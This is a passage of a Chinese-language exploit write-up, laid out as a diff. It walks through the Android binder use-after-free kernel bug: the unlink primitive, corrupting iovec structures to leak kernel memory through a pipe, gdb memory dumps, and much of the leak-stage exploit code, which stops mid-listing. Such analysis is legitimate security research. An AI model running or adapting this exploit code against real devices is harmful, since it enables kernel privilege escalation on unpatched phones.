@@ -1,0 +1,138 @@
+            bool looper_need_return; /* can be written by other thread */
+            struct binder_transaction *transaction_stack;
+            struct list_head todo;
+            bool process_todo;
+            struct binder_error return_error;
+            struct binder_error reply_error;
+            wait_queue_head_t wait;
+            struct binder_stats stats;
+            atomic_t tmp_ref;
+            bool is_dead;
+            struct task_struct *task;
+    };
+    struct __wait_queue_head {
+            spinlock_t              lock;
+            struct list_head        task_list;
+    };
+    typedef struct __wait_queue_head wait_queue_head_t;
+值得注意的是该对象驻留在kmalloc-512缓存中，这是一个可用于漏洞利用的相当不错的缓存，因为与较小的缓存相比，后台进程使用的并不多。在内核v4.4.177中该对象的大小为400个(0x190)字节。因为这个大小位于kmalloc-256和kmalloc-512之间，所以可以假设在大多数设备中这个对象最终在kmalloc-512中。
+## 泄漏内核task结构体
+### 利用unlink
+EXP利用了链表中的unlink操作。假设在自旋锁上不会崩溃，考虑一下`remove_wait_queue`函数，最终也就是`__remove_wait_queue`函数会做什么：
+    // WRITEUP COMMENT: old points to stale data / the UAF object
+    static inline void
+    __remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)
+    {
+        list_del(&old->task_list);
+    }
+    // ...
+    static inline void list_del(struct list_head *entry)
+    {
+        __list_del(entry->prev, entry->next);
+        entry->next = LIST_POISON1;
+        entry->prev = LIST_POISON2;
+    }
+    // ...
+    static inline void __list_del(struct list_head * prev, struct list_head * next)
+    {
+        next->prev = prev;
+        WRITE_ONCE(prev->next, next);
+    }
+这里最重要的一行代码是`next->prev =
+prev`，这本质上是一个unlink，它将上一个对象的指针写入到我们的UAF对象中。这很有用，因为如果我们在UAF对象的位置放置了另一个内核对象，则可以利用这种手段来覆盖另一个内核对象中的数据。Project
+Zero使用它泄漏内核数据。哪个对象适合此攻击策略？答案是iovec。  
+iovec结构体的一些属性使其成为此处漏洞利用的一个很好的候选对象。  
+1.它们很小(64位机器上为0x10)，可以控制所有字段而几乎没有限制  
+2.可以通过控制写入多少来控制iovec最终进入哪个kmalloc缓存  
+3.它们有一个指针(`iov_base`)，这是使用unlink进行破坏的理想字段  
+在正常情况下，内核将在使用`iov_base`的任何位置对其进行检查。内核将在处理请求之前首先确保`iov_base`是一个用户态指针，但是使用我们刚刚谈到的unlink，我们可以破坏此指针的验证并用内核指针(unlink中的prev)覆盖它。这意味着，当我们从写入了已覆盖的iovec的描述符中读取数据时，我们将读取的数据来自内核态指针，这将使我们能够泄漏与prev指针有关的内核数据，其中所包含的指针足以允许任意读取/写入以及代码执行。  
+这个过程中的棘手步骤是弄清楚哪个iovec索引与waitqueue对齐。这很重要，因为如果我们没有正确地伪造数据结构设备将死机，我们将无法获得任何乐趣。  
+如果拥有目标机器的内核镜像则找到waitqueue的偏移量非常容易。通过查看使用`binder_thread`的waitqueue的函数，我们可以轻松地在反汇编代码中找到偏移量。一个这样的函数是`binder_wakeup_thread_ilocked`，它会调用`wake_up_interruptible_sync(&thread->wait)`。在调用之前将地址加载到X0寄存器中时会引用偏移量。
+    .text:0000000000C0E2B4    ADD    X0, X8, #0xA0
+    .text:0000000000C0E2B8    MOV    W1, #1
+    .text:0000000000C0E2BC    MOV    W2, #1
+    .text:0000000000C0E2C0    TBZ    W19, #0, loc_C0E2CC
+    .text:0000000000C0E2C4    BL     __wake_up_sync
+在内核v4.4.177上，我们可以看到waitqueue位于`binder_thread`对象偏移0xA0处。由于iovec大小为0x10，这意味着数组中的索引0xA处的iovec将与waitqueue对齐。
+    #define BINDER_THREAD_SZ 0x190
+    #define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)
+    #define WAITQUEUE_OFFSET 0xA0
+    #define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16)
+那么，如何传递一个有效的能通过验证同时又将锁保持在0以避免死锁的`iov_base`地址？由于锁只有一个DWORD(4个字节)，并且可以传递64位指针，因此只需要用mmap映射低32位为0的用户态地址。
+    dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    // ...
+    struct iovec iovec_array[IOVEC_ARRAY_SZ];
+    memset(iovec_array, 0, sizeof(iovec_array));
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq->task_list->next */
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;
+运行EXP时，`IOVEC_INDX_FOR_WQ`处的iovec的`iov_base`和`iov_len`将分别占上锁和链表中的next指针的位置；`IOVEC_INDX_FOR_WQ+1`处的iovec的`iov_base`将占上链表中的prev指针的位置。  
+让我们看一下unlink之前和之后，运行Android-x86的VM上KGDB中被释放的内存。为此，我在`remove_wait_queue`函数上设置了一个断点，第一个参数也就是RDI寄存器将指向已释放的内存。如果在该函数被调用之前检查此内存将看到以下内容：
+    Thread 1 hit Breakpoint 11, 0xffffffff812811c2 in ep_unregister_pollwait.isra ()
+    gdb-peda$ x/50wx $rdi
+    0xffff8880959d68a0:     0x00000000      0x00000001      0x00001000      0x00000000
+    0xffff8880959d68b0:     0xdeadbeef      0x00000000      0x00001000      0x00000000
+    ...
+请注意数据与上面的iovec结构体之间的对应——例如0xffff88809239a6b0处的值为0xdeadbeef。现在，在`ep_unregister_pollwait`函数的末尾设置一个断点并检查unlink后相同的内存。
+    Thread 1 hit Breakpoint 12, 0xffffffff812811ee in ep_unregister_pollwait.isra ()
+    gdb-peda$ x/50wx 0xffff8880959d68a0
+    0xffff8880959d68a0:     0x00000000      0x00000001      0x959d68a8      0xffff8880
+    0xffff8880959d68b0:     0x959d68a8      0xffff8880      0x00001000      0x00000000
+    ...
+可看到，`IOVEC_INDX_FOR_WQ`处的iovec的`iov_len`和`IOVEC_INDX_FOR_WQ+1`处的iovec的`iov_base`被相同的内核指针覆盖——从而在内核堆中破坏了iovec内部的结构！  
+注：补上Project
+Zero博客中unlink前后的示意图。因为这里waitqueue表头之后只有一个成员，所以prev指针和next指针都被覆写成表头的地址(也就是`binder_thread`+0xa8)。  
+### 触发泄露
+Project Zero使用管道作为泄漏的媒介。攻击策略基本上如下：  
+1.创建管道  
+2.在`binder_thread`对象上触发free  
+3.在管道上调用writev函数  
+4.触发UAF/unlink破坏iovec结构  
+5.在管道上调用read函数，它将使用`IOVEC_INDX_FOR_WQ`处未被覆写的iovec读取`dummy_page`数据  
+6.在管道上再次调用read函数，它将使用`IOVEC_INDX_FOR_WQ+1`处被覆写的iovec读取内核数据  
+在两个单独的线程中处理读取和写入更容易。  
+父线程负责：  
+1.在`binder_thread`对象上触发free  
+2.在管道上调用writev函数  
+3.(等待子线程)  
+4.在管道上再次调用read函数，它将使用`IOVEC_INDX_FOR_WQ+1`处被覆写的iovec读取内核数据  
+子线程负责：  
+(接父线程中的第2步)  
+1.触发UAF/unlink破坏iovec结构  
+2.在管道上调用read函数，它将使用`IOVEC_INDX_FOR_WQ`处未被覆写的iovec读取`dummy_page`数据  
+注：这里其实原来文章没有说清楚而且有点问题，我改了一下。首先因为前10个iovec都是0所以直接跳过了，然后iovec[10].iov_len和管道的大小一样所以父进程调用writev函数从iovec[10].iov_base读取`dummy_page`数据到管道导致管道被阻塞，子进程触发UAF/unlink破坏iovec结构再读取管道解除了阻塞，这个时候父进程再调用writev函数从iovec[11].iov_base读取内核数据到管道再读取管道。补上Project
+Zero博客中的示意图。  
+现在就得到了泄漏数据的代码(请注意，从功能上讲，代码与Project
+Zero的代码相似，只不过我对其进行了一点清理并将其移植到应用程序中并添加了`__android_log_print`函数)：
+    struct epoll_event event = {.events = EPOLLIN};
+    struct iovec iovec_array[IOVEC_ARRAY_SZ];
+    char leakBuff[0x1000];
+    int pipefd[2];
+    int byteSent;
+    pid_t pid;
+    memset(iovec_array, 0, sizeof(iovec_array));
+    if(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event))
+        exitWithError("EPOLL_CTL_ADD failed: %s", strerror(errno));
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; // linked list next
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;
+    if(pipe(pipefd))
+        exitWithError("Pipe failed: %s", strerror(errno));
+    if(fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000)
+        exitWithError("F_SETPIPE_SZ failed: %s", strerror(errno));
+    pid = fork();
+    if(pid == 0)
+    {
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        sleep(2);
+        epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
+        if(read(pipefd[0], leakBuff, sizeof(leakBuff)) != sizeof(leakBuff))
+            exitWithError("[CHILD] Read failed: %s", strerror(errno));
+        close(pipefd[1]);
+        _exit(0);
+    }
+    ioctl(fd, BINDER_THREAD_EXIT, NULL);
+    byteSent = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
+    if(byteSent != 0x2000)
